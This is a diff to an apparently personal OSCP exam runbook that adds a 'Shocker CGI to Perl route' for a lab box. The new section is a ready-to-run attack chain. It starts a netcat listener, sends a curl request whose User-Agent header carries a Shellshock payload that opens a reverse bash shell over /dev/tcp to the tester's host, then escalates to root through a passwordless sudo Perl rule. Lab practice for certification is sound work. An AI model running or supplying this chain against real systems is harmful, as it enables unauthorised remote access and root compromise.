@@ -101,12 +101,40 @@ Run LinPEAS only after the direct checks, and save its output. Use it to priorit
 | No safer path and kernel is clearly vulnerable | Match distribution, kernel, architecture, and exploit prerequisites; open [[OSCP/RUNBOOK V2/Linux - Kernel Exploit\|Linux - Kernel Exploit]] |
 | Root proof is confirmed | Capture proof privately, then [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down\|Evidence and Clean Down]] |
 
+## Shocker CGI to Perl route
+
+Use this compact route when the web branch proves a Bash CGI header injection:
+
+~~~bash
+# Catch the callback after the identity proof succeeds.
+nc -lvnp "$Lport"
+
+curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
+
+# Confirm the landed identity.
+id
+whoami
+hostname
+
+# Read the exact sudo rule, then use the approved Perl interpreter.
+sudo -n -l
+sudo /usr/bin/perl -e 'exec "/bin/bash";'
+
+# Prove the privileged identity.
+id
+whoami
+~~~
+
+The callback request may time out after the shell connects. Stabilise the terminal with [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux Shell Stabilise]], then continue to [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down|Evidence and Clean Down]]. See [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].
+
 ## Write-up examples
 
 - [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- password reuse, SSH, groups, and unrestricted sudo
 - [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- sudo interpreter pivot, writable MOTD, and SUID Bash
 - [[OSCP/BOXES/WRITE UPS/Linux/CronOS|CronOS]] -- command injection and writable root scheduler
 - [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- default credential validation and direct sudo
+- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- CGI Shellshock callback and exact passwordless Perl sudo
 
 ## Detailed routes
 
